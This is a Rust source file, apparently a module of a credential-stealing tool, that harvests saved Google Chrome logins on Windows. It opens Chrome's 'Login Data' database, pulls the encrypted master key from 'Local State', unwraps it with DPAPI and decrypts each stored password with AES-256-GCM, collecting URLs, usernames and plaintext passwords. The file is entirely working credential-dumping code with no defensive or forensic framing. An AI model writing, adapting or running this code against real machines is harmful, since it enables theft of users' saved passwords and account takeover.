
// SQLite Library
use rusqlite::{Connection, OpenFlags, NO_PARAMS};

// Standard Library
use std::{fs, ptr::{copy, null_mut}};

// WinAPI Wrapper Library
extern crate winapi;
use winapi::{shared::minwindef::{DWORD, HLOCAL},
um::dpapi::CryptUnprotectData,
um::winbase::LocalFree,
um::wincrypt::CRYPTOAPI_BLOB};

// JSON Library
use serde_json::Value;

// AES GCM Library
use aes_gcm::Aes256Gcm;
use aes_gcm::aead::{Aead, NewAead, generic_array::GenericArray};

pub struct ChromeData {
    pub cd_entries: Vec<ChromeDataEntry>,
    pub login_data_path: String,
    pub encryption_key: Vec<u8>,
}

pub struct ChromeDataEntry {
    pub origin_url: String,
    pub action_url: String,
    pub username: String,
    pub password: String,
    pub date_c: i64,
    pub date_lu: i64,
}

impl ChromeData {

    pub fn new() -> Self {
        ChromeData {
            cd_entries: Vec::<ChromeDataEntry>::new(),
            login_data_path: String::new(),
            encryption_key: Vec::<u8>::new(),
        }
    }

    // Retrieve Chrome Login Data
    pub fn ret_chrome_logins(&mut self) {
        self.set_login_data_path();
        self.cld_extract();
    }

    // Query SQLite DB / Extract data / Put data into ChromeDataEntry and fill ChromeData object
    fn cld_extract(&mut self) {

        let db_conn = Connection::open_with_flags(self.login_data_path.clone(), OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = match db_conn.prepare("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created") {
            Ok(r) => r,
            Err(_) => {return}
        };

        let logins = stmt.query_map(NO_PARAMS, |row| {

            let date_created: i64 = row.get(4).unwrap();
            let date_last_used: i64 = row.get(5).unwrap();
            Ok(ChromeDataEntry{
                origin_url: row.get(0).unwrap(),
                action_url: row.get(1).unwrap(),
                username: row.get(2).unwrap(),
                password: self.decrypt_password(self.get_aes_key(), row.get(3).unwrap()),
                date_c: date_created,
                date_lu: date_last_used,
            })
        }).unwrap();

        let mut chrome_entries = Vec::<ChromeDataEntry>::new();
        for login in logins {
            if let Ok(cde) = login {
                chrome_entries.push(cde);
            }
        }
        self.cd_entries = chrome_entries;
    }

    // Set Login Data file path
    fn set_login_data_path(&mut self) {
        let path_local_state = platform_dirs::AppDirs::new(Some("Google\\Chrome\\User Data\\Default\\Login Data"), false).unwrap().data_dir.as_path().to_str().unwrap().to_owned();
        self.login_data_path = path_local_state.to_string();
    }

    // Get AES Key from chrome 'Local State'
    fn get_aes_key(&self) -> Vec<u8> {

        // Parse key from json file and decode it (Base64)
        // Delete first 5 bytes (DPAPI string)
        // get decrypted AES key from CryptUnprotectData from DPAPI
        // return bytes of decrypted AES key
    
        let raw_json_data = fs::read(platform_dirs::AppDirs::new(Some("Google\\Chrome\\User Data\\Local State"), false).unwrap().data_dir.as_path().to_str().unwrap()).unwrap();
        let json_string = String::from_utf8(raw_json_data).unwrap();
        let json_data_ser: Value = serde_json::from_str(json_string.as_str()).unwrap();
        
        let encrypted_key = json_data_ser["os_crypt"]["encrypted_key"].to_string().replace("\"", "");
        let mut encrypted_key_bytes = base64::decode(encrypted_key).unwrap();
        let clean_encrypted_key_bytes: Vec<u8> = encrypted_key_bytes.drain(5..).collect();
    
        self.dpapi_decrypt(clean_encrypted_key_bytes)
    }

    // Decrypts bytes using DPAPI
    fn dpapi_decrypt(&self, mut enc: Vec<u8>) -> Vec<u8> {

        unsafe {
            let mut in_blob = CRYPTOAPI_BLOB {
                cbData: enc.len() as DWORD,
                pbData: enc.as_mut_ptr(),
            };
    
            let mut out_blob = CRYPTOAPI_BLOB {
                cbData: 0,
                pbData: null_mut(),
            };
    
            let _ret_code = CryptUnprotectData(&mut in_blob, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut out_blob);
            let out_blob_size = out_blob.cbData as usize;
            let mut buffer: Vec<u8> = Vec::with_capacity(out_blob_size);
            buffer.set_len(out_blob_size);
            copy(out_blob.pbData, buffer.as_mut_ptr(), out_blob_size);
    
            LocalFree(out_blob.pbData as HLOCAL);
            return buffer;
        }
    }

    // AES256GCM Decrypt
    fn decrypt_password(&self, aes_key: Vec<u8>, mut enc_pass: Vec<u8>) -> String {

        let mut iv_dup = enc_pass.clone();
        let iv: Vec<u8> = iv_dup.drain(3..15).collect();
        let password_enc: Vec<u8> = enc_pass.drain(15..).collect();
        let key = GenericArray::from_slice(aes_key.as_slice());
        let cipher = Aes256Gcm::new(key);
        let nonce = GenericArray::from_slice(iv.as_slice());
        let pw_pt = cipher.decrypt(nonce, password_enc.as_ref()).unwrap();
        String::from_utf8(pw_pt).unwrap()
    }
}